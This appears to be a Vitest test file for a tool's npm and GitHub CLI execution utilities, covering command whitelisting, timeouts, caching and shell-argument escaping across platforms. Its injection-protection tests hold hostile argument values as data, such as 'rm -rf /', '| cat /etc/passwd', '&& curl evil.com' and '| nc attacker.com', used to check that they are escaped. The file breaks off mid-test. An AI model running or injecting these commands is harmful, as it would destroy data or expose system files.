import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// Use vi.hoisted to ensure mocks are available during module initialization
const mockExec = vi.hoisted(() => vi.fn());
const mockGenerateCacheKey = vi.hoisted(() => vi.fn());
const mockWithCache = vi.hoisted(() => vi.fn());
const mockPlatform = vi.hoisted(() => vi.fn());

// Mock child_process
vi.mock('child_process', () => ({
  exec: mockExec,
}));

// Mock util - promisify should convert callback-style to promise-style
vi.mock('util', () => ({
  promisify: vi.fn((fn: any) => {
    return (...args: any[]) => {
      return new Promise((resolve, reject) => {
        fn(...args, (error: any, result: any) => {
          if (error) {
            reject(error);
          } else {
            resolve(result);
          }
        });
      });
    };
  }),
}));

// Mock os module for cross-platform testing
vi.mock('os', () => ({
  platform: mockPlatform,
}));

// Mock cache utilities
vi.mock('../../src/utils/cache.js', () => ({
  generateCacheKey: mockGenerateCacheKey,
  withCache: mockWithCache,
}));

// Import after mocking
import type { CallToolResult } from '@modelcontextprotocol/sdk/types';
import {
  executeNpmCommand,
  executeGitHubCommand,
} from '../../src/utils/exec.js';

describe('Exec Utilities', () => {
  beforeEach(() => {
    // Clear all mocks before each test
    vi.clearAllMocks();

    // Default implementation for withCache - just execute the function
    mockWithCache.mockImplementation(
      async (key: string, fn: () => Promise<CallToolResult>) => fn()
    );

    // Default cache key generation
    mockGenerateCacheKey.mockReturnValue('test-cache-key');
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('executeNpmCommand', () => {
    describe('Command Validation', () => {
      it('should accept valid npm commands', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '{"name": "test-package"}', stderr: '' });
        });

        const result = await executeNpmCommand('view', ['test-package']);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          'npm view test-package',
          expect.objectContaining({
            timeout: 30000,
            shell: '/bin/sh',
          }),
          expect.any(Function)
        );
      });

      it('should reject invalid npm commands', async () => {
        const result = await executeNpmCommand('invalid-command' as any, []);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain('Command not registered');
        expect(result.content[0].text).toContain('invalid-command');
        expect(mockExec).not.toHaveBeenCalled();
      });

      it('should accept all allowed npm commands', async () => {
        const allowedCommands = ['view', 'search', 'ping', 'config', 'whoami'];

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        for (const command of allowedCommands) {
          const result = await executeNpmCommand(command as any, []);
          expect(result.isError).toBe(false);
        }

        expect(mockExec).toHaveBeenCalledTimes(allowedCommands.length);
      });
    });

    describe('Successful Execution', () => {
      it('should execute npm view command successfully', async () => {
        const mockStdout = JSON.stringify({
          name: 'react',
          version: '18.2.0',
          description: 'React library',
        });

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: mockStdout, stderr: '' });
        });

        const result = await executeNpmCommand('view', ['react']);

        expect(result.isError).toBe(false);
        const data = JSON.parse(result.content[0].text as string);
        expect(data.result).toBe(mockStdout);
        expect(data.command).toBe('npm view react');
        expect(data.type).toBe('npm');
        expect(data.timestamp).toBeDefined();
      });

      it('should handle npm commands with multiple arguments', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'search results', stderr: '' });
        });

        const result = await executeNpmCommand('search', ['react', '--json']);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          'npm search react --json',
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should include warnings without treating as errors', async () => {
        const mockStdout = '{"name": "test"}';
        const mockStderr =
          'npm WARN deprecated package@1.0.0: This package is deprecated';

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: mockStdout, stderr: mockStderr });
        });

        const result = await executeNpmCommand('view', ['test']);

        expect(result.isError).toBe(false);
        const data = JSON.parse(result.content[0].text as string);
        expect(data.warning).toBe(mockStderr);
        expect(data.result).toBe(mockStdout);
      });
    });

    describe('Error Handling', () => {
      it('should handle command execution errors', async () => {
        const mockError = new Error('Command failed');
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(mockError);
        });

        const result = await executeNpmCommand('view', ['nonexistent']);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain(
          'Failed to execute NPM command'
        );
        expect(result.content[0].text).toContain('Command failed');
      });

      it('should treat stderr as error for npm (excluding warnings)', async () => {
        const mockStderr = 'npm ERR! 404 Not Found';
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '', stderr: mockStderr });
        });

        const result = await executeNpmCommand('view', ['nonexistent']);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain('NPM command error');
        expect(result.content[0].text).toContain(mockStderr);
      });

      it('should handle timeout errors', async () => {
        const timeoutError = new Error('Command timed out');
        timeoutError.message = 'Command timed out after 30000ms';

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(timeoutError);
        });

        const result = await executeNpmCommand('view', ['slow-package']);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain('timed out');
      });
    });

    describe('Options Handling', () => {
      it('should use custom timeout when provided', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], { timeout: 5000 });

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            timeout: 5000,
          }),
          expect.any(Function)
        );
      });

      it('should use custom working directory when provided', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], { cwd: '/custom/path' });

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            cwd: '/custom/path',
          }),
          expect.any(Function)
        );
      });

      it('should use custom environment variables', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], {
          env: { CUSTOM_VAR: 'value' },
        });

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            env: expect.objectContaining({
              CUSTOM_VAR: 'value',
              SHELL: '/bin/sh',
            }),
          }),
          expect.any(Function)
        );
      });
    });

    describe('Caching', () => {
      it('should use cache when cache option is true', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'cached result', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], { cache: true });

        expect(mockGenerateCacheKey).toHaveBeenCalledWith('npm-exec', {
          command: 'view',
          args: ['test'],
          shell: 'unix',
        });
        expect(mockWithCache).toHaveBeenCalledWith(
          'test-cache-key',
          expect.any(Function)
        );
      });

      it('should not use cache when cache option is false', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'direct result', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], { cache: false });

        expect(mockGenerateCacheKey).not.toHaveBeenCalled();
        expect(mockWithCache).not.toHaveBeenCalled();
      });

      it('should not use cache by default', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'default result', stderr: '' });
        });

        await executeNpmCommand('view', ['test']);

        expect(mockGenerateCacheKey).not.toHaveBeenCalled();
        expect(mockWithCache).not.toHaveBeenCalled();
      });
    });
  });

  describe('executeGitHubCommand', () => {
    describe('Command Validation', () => {
      it('should accept valid GitHub commands', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '[]', stderr: '' });
        });

        const result = await executeGitHubCommand('search', ['repos', 'react']);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          'gh search repos react',
          expect.objectContaining({
            timeout: 60000,
            shell: '/bin/sh',
          }),
          expect.any(Function)
        );
      });

      it('should reject invalid GitHub commands', async () => {
        const result = await executeGitHubCommand('invalid-command' as any, []);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain('Command not registered');
        expect(result.content[0].text).toContain('invalid-command');
        expect(mockExec).not.toHaveBeenCalled();
      });

      it('should accept all allowed GitHub commands', async () => {
        const allowedCommands = ['search', 'api', 'auth', 'org'];

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        for (const command of allowedCommands) {
          const result = await executeGitHubCommand(command as any, []);
          expect(result.isError).toBe(false);
        }

        expect(mockExec).toHaveBeenCalledTimes(allowedCommands.length);
      });
    });

    describe('Successful Execution', () => {
      it('should execute GitHub search command successfully', async () => {
        const mockStdout = JSON.stringify([
          { name: 'react', full_name: 'facebook/react' },
        ]);

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: mockStdout, stderr: '' });
        });

        const result = await executeGitHubCommand('search', [
          'repos',
          'react',
          '--json',
        ]);

        expect(result.isError).toBe(false);
        const data = JSON.parse(result.content[0].text as string);
        expect(data.result).toBe(mockStdout);
        expect(data.command).toBe('gh search repos react --json');
        expect(data.type).toBe('github');
        expect(data.timestamp).toBeDefined();
      });

      it('should handle GitHub API calls', async () => {
        const mockStdout = '{"login": "user"}';

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: mockStdout, stderr: '' });
        });

        const result = await executeGitHubCommand('api', ['/user']);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          'gh api /user',
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should include GitHub CLI warnings without treating as errors', async () => {
        const mockStdout = '{"status": "ok"}';
        const mockStderr = 'Warning: API rate limit exceeded';

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: mockStdout, stderr: mockStderr });
        });

        const result = await executeGitHubCommand('api', ['/rate_limit']);

        expect(result.isError).toBe(false);
        const data = JSON.parse(result.content[0].text as string);
        expect(data.warning).toBe(mockStderr);
        expect(data.result).toBe(mockStdout);
      });

      it('should ignore notice messages', async () => {
        const mockStdout = 'Success';
        const mockStderr = 'notice: Authentication is required';

        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: mockStdout, stderr: mockStderr });
        });

        const result = await executeGitHubCommand('auth', ['status']);

        expect(result.isError).toBe(false);
        const data = JSON.parse(result.content[0].text as string);
        expect(data.warning).toBe(mockStderr);
      });
    });

    describe('Error Handling', () => {
      it('should handle GitHub CLI errors', async () => {
        const mockError = new Error('GitHub CLI not found');
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(mockError);
        });

        const result = await executeGitHubCommand('search', ['repos', 'test']);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain(
          'Failed to execute GitHub CLI command'
        );
        expect(result.content[0].text).toContain('GitHub CLI not found');
      });

      it('should treat significant stderr as error', async () => {
        const mockStderr = 'GraphQL: Could not resolve to a Repository';
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '', stderr: mockStderr });
        });

        const result = await executeGitHubCommand('api', [
          '/repos/invalid/repo',
        ]);

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain('GitHub CLI command error');
        expect(result.content[0].text).toContain(mockStderr);
      });

      it('should use longer timeout for GitHub commands', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeGitHubCommand('search', ['repos', 'test']);

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            timeout: 60000, // 60 seconds vs 30 for npm
          }),
          expect.any(Function)
        );
      });
    });

    describe('Caching', () => {
      it('should use cache when cache option is true', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'cached github result', stderr: '' });
        });

        await executeGitHubCommand('search', ['repos', 'test'], {
          cache: true,
        });

        expect(mockGenerateCacheKey).toHaveBeenCalledWith('gh-exec', {
          command: 'search',
          args: ['repos', 'test'],
          shell: 'unix',
        });
        expect(mockWithCache).toHaveBeenCalledWith(
          'test-cache-key',
          expect.any(Function)
        );
      });
    });
  });

  describe('Security and Shell Injection Protection', () => {
    describe('NPM Command Injection Protection', () => {
      it('should escape shell special characters in npm arguments', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'safe execution', stderr: '' });
        });

        // Try to inject malicious commands
        const maliciousArgs = [
          'test; rm -rf /', // Should be escaped
          '&& echo "hacked"', // Should be escaped
          '| cat /etc/passwd', // Should be escaped
          "'; DROP TABLE users; --", // SQL injection attempt
          '$(rm -rf /)', // Command substitution
          '`rm -rf /`', // Backtick command substitution
        ];

        const result = await executeNpmCommand('view', maliciousArgs);

        expect(result.isError).toBe(false);
        // Verify arguments are properly escaped with single quotes
        expect(mockExec).toHaveBeenCalledWith(
          "npm view 'test; rm -rf /' '&& echo \"hacked\"' '| cat /etc/passwd' ''\"'\"'; DROP TABLE users; --' '$(rm -rf /)' '`rm -rf /`'",
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should handle arguments with single quotes correctly', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'safe execution', stderr: '' });
        });

        const argsWithQuotes = [
          "test'package", // Contains single quote
          "it's a test", // Contains single quote in sentence
          "'malicious'", // Wrapped in single quotes
        ];

        const result = await executeNpmCommand('view', argsWithQuotes);

        expect(result.isError).toBe(false);
        // Verify single quotes are properly escaped
        expect(mockExec).toHaveBeenCalledWith(
          "npm view 'test'\"'\"'package' 'it'\"'\"'s a test' ''\"'\"'malicious'\"'\"''",
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should not escape safe characters in npm arguments', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'safe execution', stderr: '' });
        });

        const safeArgs = [
          'package-name', // Hyphens allowed
          'package.name', // Dots allowed
          'package_name', // Underscores allowed
          'package123', // Numbers allowed
          'scope/package', // Slashes allowed
          'version=1.0.0', // Equals allowed
          '@scope/package', // @ symbol allowed
        ];

        const result = await executeNpmCommand('view', safeArgs);

        expect(result.isError).toBe(false);
        // Verify safe arguments are not escaped
        expect(mockExec).toHaveBeenCalledWith(
          'npm view package-name package.name package_name package123 scope/package version=1.0.0 @scope/package',
          expect.any(Object),
          expect.any(Function)
        );
      });
    });

    describe('GitHub Command Injection Protection', () => {
      it('should escape shell special characters in github arguments', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '[]', stderr: '' });
        });

        const maliciousArgs = [
          'repos',
          'test; rm -rf /', // Should be escaped
          '&& curl evil.com', // Should be escaped
          '| nc attacker.com', // Should be escaped
        ];

        const result = await executeGitHubCommand('search', maliciousArgs);

        expect(result.isError).toBe(false);
        // Verify arguments are properly escaped
        expect(mockExec).toHaveBeenCalledWith(
          "gh search repos 'test; rm -rf /' '&& curl evil.com' '| nc attacker.com'",
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should handle complex github search queries safely', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '[]', stderr: '' });
        });

        const searchArgs = [
          'repos',
          'language:javascript && evil', // Should be escaped due to &&
          'stars:>100 | evil', // Should be escaped due to |
          'user:test; rm -rf /', // Should be escaped due to ;
        ];

        const result = await executeGitHubCommand('search', searchArgs);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          "gh search repos 'language:javascript && evil' 'stars:>100 | evil' 'user:test; rm -rf /'",
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should not escape safe github arguments', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '[]', stderr: '' });
        });

        const safeArgs = [
          'repos',
          'language:javascript',
          'stars:>100',
          'user:octocat',
          'org:github',
          '--json',
          '--limit=10',
        ];

        const result = await executeGitHubCommand('search', safeArgs);

        expect(result.isError).toBe(false);
        // Verify safe arguments are not escaped (except > which is special)
        expect(mockExec).toHaveBeenCalledWith(
          "gh search repos language:javascript 'stars:>100' user:octocat org:github --json --limit=10",
          expect.any(Object),
          expect.any(Function)
        );
      });
    });

    describe('Command Validation Security', () => {
      it('should prevent execution of non-whitelisted npm commands', async () => {
        // These should all be rejected without calling exec
        const invalidCommands = [
          'install',
          'uninstall',
          'run',
          'exec',
          'publish',
          'unpublish',
          'init',
          '../malicious',
          'view && rm -rf /',
        ];

        for (const cmd of invalidCommands) {
          const result = await executeNpmCommand(cmd as any, []);
          expect(result.isError).toBe(true);
          expect(result.content[0].text).toContain('Command not registered');
        }

        expect(mockExec).not.toHaveBeenCalled();
      });

      it('should prevent execution of non-whitelisted github commands', async () => {
        // These should all be rejected without calling exec
        const invalidCommands = [
          'repo',
          'issue',
          'pr',
          'workflow',
          'release',
          'clone',
          '../malicious',
          'api && rm -rf /',
        ];

        for (const cmd of invalidCommands) {
          const result = await executeGitHubCommand(cmd as any, []);
          expect(result.isError).toBe(true);
          expect(result.content[0].text).toContain('Command not registered');
        }

        expect(mockExec).not.toHaveBeenCalled();
      });
    });

    describe('Shell Environment Security', () => {
      it('should use safe shell environment for npm commands', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test']);

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            shell: '/bin/sh',
            env: expect.objectContaining({
              SHELL: '/bin/sh',
            }),
          }),
          expect.any(Function)
        );
      });

      it('should use safe shell environment for github commands', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '[]', stderr: '' });
        });

        await executeGitHubCommand('search', ['repos', 'test']);

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            shell: '/bin/sh',
            env: expect.objectContaining({
              SHELL: '/bin/sh',
            }),
          }),
          expect.any(Function)
        );
      });

      it('should preserve PATH environment variable', async () => {
        const originalPath = process.env.PATH;
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test']);

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            env: expect.objectContaining({
              PATH: originalPath,
            }),
          }),
          expect.any(Function)
        );
      });

      it('should merge custom environment variables safely', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], {
          env: {
            CUSTOM_VAR: 'safe_value',
            PATH: '/malicious/path', // Should be overridden by original PATH
          },
        });

        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            env: expect.objectContaining({
              CUSTOM_VAR: 'safe_value',
              SHELL: '/bin/sh',
              PATH: process.env.PATH, // Original PATH should be preserved
            }),
          }),
          expect.any(Function)
        );
      });
    });
  });

  describe('Error Handling Patterns', () => {
    describe('NPM-specific Error Handling', () => {
      it('should distinguish npm warnings from errors', async () => {
        const testCases = [
          {
            stderr: 'npm WARN deprecated some-package@1.0.0',
            shouldError: false,
            description: 'npm deprecation warning',
          },
          {
            stderr: 'npm WARN optional SKIPPING OPTIONAL DEPENDENCY',
            shouldError: false,
            description: 'npm optional dependency warning',
          },
          {
            stderr: 'npm ERR! 404 Not Found',
            shouldError: true,
            description: 'npm error',
          },
          {
            stderr: 'Error: Package not found',
            shouldError: true,
            description: 'generic error',
          },
        ];

        for (const testCase of testCases) {
          mockExec.mockImplementation((cmd, opts, callback) => {
            callback(null, { stdout: 'some output', stderr: testCase.stderr });
          });

          const result = await executeNpmCommand('view', ['test']);

          if (testCase.shouldError) {
            expect(result.isError).toBe(true);
            expect(result.content[0].text).toContain('NPM command error');
            expect(result.content[0].text).toContain(testCase.stderr);
          } else {
            expect(result.isError).toBe(false);
            const data = JSON.parse(result.content[0].text as string);
            expect(data.warning).toBe(testCase.stderr);
          }
        }
      });
    });

    describe('GitHub-specific Error Handling', () => {
      it('should distinguish github warnings from errors', async () => {
        const testCases = [
          {
            stderr: 'Warning: API rate limit exceeded',
            shouldError: false,
            description: 'github warning',
          },
          {
            stderr: 'notice: Authentication required',
            shouldError: false,
            description: 'github notice',
          },
          {
            stderr: 'No such file or directory',
            shouldError: false,
            description: 'shell error to ignore',
          },
          {
            stderr: '',
            shouldError: false,
            description: 'empty stderr',
          },
          {
            stderr: '   ',
            shouldError: false,
            description: 'whitespace-only stderr',
          },
          {
            stderr: 'GraphQL: Could not resolve to a Repository',
            shouldError: true,
            description: 'github API error',
          },
          {
            stderr: 'HTTP 404: Not Found',
            shouldError: true,
            description: 'HTTP error',
          },
        ];

        for (const testCase of testCases) {
          mockExec.mockImplementation((cmd, opts, callback) => {
            callback(null, { stdout: 'some output', stderr: testCase.stderr });
          });

          const result = await executeGitHubCommand('search', [
            'repos',
            'test',
          ]);

          if (testCase.shouldError) {
            expect(result.isError).toBe(true);
            expect(result.content[0].text).toContain(
              'GitHub CLI command error'
            );
            expect(result.content[0].text).toContain(testCase.stderr);
          } else {
            expect(result.isError).toBe(false);
            const data = JSON.parse(result.content[0].text as string);
            if (testCase.stderr) {
              expect(data.warning).toBe(testCase.stderr);
            } else {
              expect(data.warning).toBeUndefined();
            }
          }
        }
      });
    });

    describe('Timeout Handling', () => {
      it('should use different default timeouts for npm vs github', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        // Test NPM timeout (30 seconds)
        await executeNpmCommand('view', ['test']);
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({ timeout: 30000 }),
          expect.any(Function)
        );

        // Test GitHub timeout (60 seconds)
        await executeGitHubCommand('search', ['repos', 'test']);
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({ timeout: 60000 }),
          expect.any(Function)
        );
      });

      it('should respect custom timeout options', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], { timeout: 5000 });
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({ timeout: 5000 }),
          expect.any(Function)
        );

        await executeGitHubCommand('search', ['repos', 'test'], {
          timeout: 120000,
        });
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({ timeout: 120000 }),
          expect.any(Function)
        );
      });
    });
  });

  describe('Result Format Validation', () => {
    it('should return properly formatted success results', async () => {
      const testStdout = '{"test": "data"}';
      const testStderr = 'npm WARN deprecated test warning';

      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: testStdout, stderr: testStderr });
      });

      const result = await executeNpmCommand('view', ['test-package']);

      expect(result.isError).toBe(false);
      expect(result.content).toHaveLength(1);
      expect(result.content[0].type).toBe('text');

      const data = JSON.parse(result.content[0].text as string);
      expect(data.command).toBe('npm view test-package');
      expect(data.result).toBe(testStdout);
      expect(data.type).toBe('npm');
      expect(data.warning).toBe(testStderr);
      expect(data.timestamp).toMatch(
        /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/
      );
    });

    it('should return properly formatted error results', async () => {
      const testError = new Error('Test error message');

      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(testError);
      });

      const result = await executeNpmCommand('view', ['test-package']);

      expect(result.isError).toBe(true);
      expect(result.content).toHaveLength(1);
      expect(result.content[0].type).toBe('text');
      expect(result.content[0].text).toBe(
        'Failed to execute NPM command: Test error message'
      );
    });

    it('should not include warning field when stderr is empty', async () => {
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: 'success', stderr: '' });
      });

      const result = await executeNpmCommand('view', ['test']);

      expect(result.isError).toBe(false);
      const data = JSON.parse(result.content[0].text as string);
      expect(data.warning).toBeUndefined();
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty stdout', async () => {
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: '', stderr: '' });
      });

      const result = await executeNpmCommand('ping');

      expect(result.isError).toBe(false);
      const data = JSON.parse(result.content[0].text as string);
      expect(data.result).toBe('');
    });

    it('should handle commands with no arguments', async () => {
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: 'npm ping success', stderr: '' });
      });

      const result = await executeNpmCommand('ping');

      expect(result.isError).toBe(false);
      expect(mockExec).toHaveBeenCalledWith(
        'npm ping ',
        expect.any(Object),
        expect.any(Function)
      );
    });

    it('should handle very long command outputs', async () => {
      const longOutput = 'x'.repeat(100000); // 100KB output
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: longOutput, stderr: '' });
      });

      const result = await executeNpmCommand('search', ['popular']);

      expect(result.isError).toBe(false);
      const data = JSON.parse(result.content[0].text as string);
      expect(data.result).toBe(longOutput);
    });

    it('should handle undefined options gracefully', async () => {
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: 'success', stderr: '' });
      });

      // Pass undefined options - should use defaults
      const result = await executeNpmCommand(
        'view',
        ['test'],
        undefined as any
      );

      expect(result.isError).toBe(false);
      expect(mockExec).toHaveBeenCalledWith(
        expect.any(String),
        expect.objectContaining({
          timeout: 30000, // Default NPM timeout
          shell: '/bin/sh',
        }),
        expect.any(Function)
      );
    });

    it('should handle empty args array', async () => {
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: 'success', stderr: '' });
      });

      const result = await executeNpmCommand('ping', []);

      expect(result.isError).toBe(false);
      expect(mockExec).toHaveBeenCalledWith(
        'npm ping ',
        expect.any(Object),
        expect.any(Function)
      );
    });

    it('should handle special encoding characters', async () => {
      const specialOutput =
        '{"name": "test", "desc": "Special chars: ñ, ü, 中文, 🚀"}';
      mockExec.mockImplementation((cmd, opts, callback) => {
        callback(null, { stdout: specialOutput, stderr: '' });
      });

      const result = await executeNpmCommand('view', ['test']);

      expect(result.isError).toBe(false);
      const data = JSON.parse(result.content[0].text as string);
      expect(data.result).toBe(specialOutput);

      // Verify encoding option is set
      expect(mockExec).toHaveBeenCalledWith(
        expect.any(String),
        expect.objectContaining({
          encoding: 'utf-8',
        }),
        expect.any(Function)
      );
    });
  });

  describe('Cross-Platform Compatibility', () => {
    beforeEach(() => {
      // Clear all mocks before each test
      vi.clearAllMocks();

      // Default implementation for withCache - just execute the function
      mockWithCache.mockImplementation(
        async (key: string, fn: () => Promise<CallToolResult>) => fn()
      );

      // Default cache key generation
      mockGenerateCacheKey.mockReturnValue('test-cache-key');
    });

    describe('Windows Platform Behavior', () => {
      beforeEach(() => {
        // Mock platform to return 'win32' for Windows tests
        mockPlatform.mockReturnValue('win32');
      });

      it('should use cmd.exe shell on Windows by default', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        const result = await executeNpmCommand('view', ['test']);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            shell: 'cmd.exe',
            env: expect.objectContaining({
              SHELL: 'cmd.exe',
            }),
          }),
          expect.any(Function)
        );

        const data = JSON.parse(result.content[0].text as string);
        expect(data.platform).toBe('win32');
        expect(data.shell).toBe('cmd.exe');
        expect(data.shellType).toBe('cmd');
      });

      it('should use Windows-style argument escaping for cmd.exe', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        // Test Windows CMD special characters that need escaping
        const windowsSpecialArgs = [
          'test package', // Space - should be quoted
          'test&malicious', // & - should be quoted
          'test<input', // < - should be quoted
          'test>output', // > - should be quoted
          'test|pipe', // | - should be quoted
          'test^caret', // ^ - should be quoted
          'test"quote', // " - should be quoted and escaped
          'safe-arg', // Safe arg - should not be quoted
          'safe.arg', // Safe arg - should not be quoted
          'safe_arg', // Safe arg - should not be quoted
        ];

        const result = await executeNpmCommand('view', windowsSpecialArgs);

        expect(result.isError).toBe(false);
        // Verify Windows-style double quote escaping
        expect(mockExec).toHaveBeenCalledWith(
          'npm view "test package" "test&malicious" "test<input" "test>output" "test|pipe" "test^caret" "test""quote" safe-arg safe.arg safe_arg',
          expect.any(Object),
          expect.any(Function)
        );
      });
    });

    describe('PowerShell Support', () => {
      beforeEach(() => {
        // Mock platform to return 'win32' for Windows tests
        mockPlatform.mockReturnValue('win32');
      });

      it('should use PowerShell when explicitly specified', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        const result = await executeNpmCommand('view', ['test'], {
          windowsShell: 'powershell',
        });

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            shell: 'powershell.exe',
            env: expect.objectContaining({
              SHELL: 'powershell.exe',
            }),
          }),
          expect.any(Function)
        );

        const data = JSON.parse(result.content[0].text as string);
        expect(data.platform).toBe('win32');
        expect(data.shell).toBe('powershell.exe');
        expect(data.shellType).toBe('powershell');
      });

      it('should use PowerShell-style argument escaping', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        // Test PowerShell special characters that need escaping
        const powershellSpecialArgs = [
          'test package', // Space - should be quoted
          'test&malicious', // & - should be quoted
          'test<input', // < - should be quoted
          'test>output', // > - should be quoted
          'test|pipe', // | - should be quoted
          'test;separator', // ; - should be quoted
          'test`backtick', // ` - should be quoted
          'test$variable', // $ - should be quoted
          'test@symbol', // @ - should be quoted
          'test"quote', // " - should be quoted
          "test'single", // ' - should be quoted and escaped
          'test(paren)', // () - should be quoted
          'test[bracket]', // [] - should be quoted
          'test{brace}', // {} - should be quoted
          'safe-arg', // Safe arg - should not be quoted
          'safe.arg', // Safe arg - should not be quoted
          'safe_arg', // Safe arg - should not be quoted
        ];

        const result = await executeNpmCommand('view', powershellSpecialArgs, {
          windowsShell: 'powershell',
        });

